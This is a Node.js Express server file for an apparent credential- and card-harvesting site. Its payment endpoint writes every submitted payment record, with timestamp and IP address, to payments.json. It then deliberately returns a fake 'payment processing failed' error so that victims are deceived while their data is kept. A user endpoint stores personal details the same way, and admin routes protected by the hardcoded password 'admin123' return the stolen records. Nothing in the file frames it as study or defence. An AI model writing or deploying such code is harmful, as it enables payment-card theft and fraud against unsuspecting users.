const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static(path.join(__dirname)));

// Middleware to parse JSON bodies
app.use(express.json());

// Serve the main HTML file for all routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// API endpoint to store payment data
app.post('/api/store-payment', (req, res) => {
  try {
    const data = req.body;
    
    // Add timestamp and IP address
    data.timestamp = new Date().toISOString();
    data.ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Read existing data
    let payments = [];
    if (fs.existsSync('payments.json')) {
      const fileContent = fs.readFileSync('payments.json', 'utf8');
      payments = JSON.parse(fileContent);
    }
    
    // Add new payment data
    payments.push(data);
    
    // Write back to file
    fs.writeFileSync('payments.json', JSON.stringify(payments, null, 2));
    
    // Return error to simulate payment failure while still storing the data
    res.status(500).json({
      success: false,
      message: 'Payment processing failed. Please check your payment details and try again. Our team has been notified and will resolve this issue shortly.'
    });
  } catch (error) {
    console.error('Error storing payment data:', error);
    res.status(500).json({
      success: false,
      message: 'An unexpected error occurred. Please try again later.'
    });
  }
});

// API endpoint to store user data
app.post('/api/store-user', (req, res) => {
  try {
    const data = req.body;
    
    // Add timestamp and IP address
    data.timestamp = new Date().toISOString();
    data.ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Read existing data
    let users = [];
    if (fs.existsSync('users.json')) {
      const fileContent = fs.readFileSync('users.json', 'utf8');
      users = JSON.parse(fileContent);
    }
    
    // Add new user data
    users.push(data);
    
    // Write back to file
    fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error storing user data:', error);
    res.status(500).json({
      success: false,
      message: 'An unexpected error occurred. Please try again later.'
    });
  }
});

// Admin API endpoints (protected with basic authentication)
app.get('/api/admin/payments', (req, res) => {
  // Basic authentication check
  const auth = req.headers.authorization;
  if (!auth || auth !== 'Basic YWRtaW46YWRtaW4xMjM=') { // admin:admin123 in Base64
    res.status(401).json({ success: false, message: 'Unauthorized' });
    return;
  }
  
  try {
    if (fs.existsSync('payments.json')) {
      const fileContent = fs.readFileSync('payments.json', 'utf8');
      const payments = JSON.parse(fileContent);
      res.json({ success: true, data: payments });
    } else {
      res.json({ success: true, data: [] });
    }
  } catch (error) {
    console.error('Error retrieving payment data:', error);
    res.status(500).json({
      success: false,
      message: 'An unexpected error occurred. Please try again later.'
    });
  }
});

app.get('/api/admin/users', (req, res) => {
  // Basic authentication check
  const auth = req.headers.authorization;
  if (!auth || auth !== 'Basic YWRtaW46YWRtaW4xMjM=') { // admin:admin123 in Base64
    res.status(401).json({ success: false, message: 'Unauthorized' });
    return;
  }
  
  try {
    if (fs.existsSync('users.json')) {
      const fileContent = fs.readFileSync('users.json', 'utf8');
      const users = JSON.parse(fileContent);
      res.json({ success: true, data: users });
    } else {
      res.json({ success: true, data: [] });
    }
  } catch (error) {
    console.error('Error retrieving user data:', error);
    res.status(500).json({
      success: false,
      message: 'An unexpected error occurred. Please try again later.'
    });
  }
});

// Serve all other routes with index.html for client-side routing
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the website at: http://localhost:${PORT}`);
  console.log(`Access the admin panel at: http://localhost:${PORT}/admin-login.html`);
});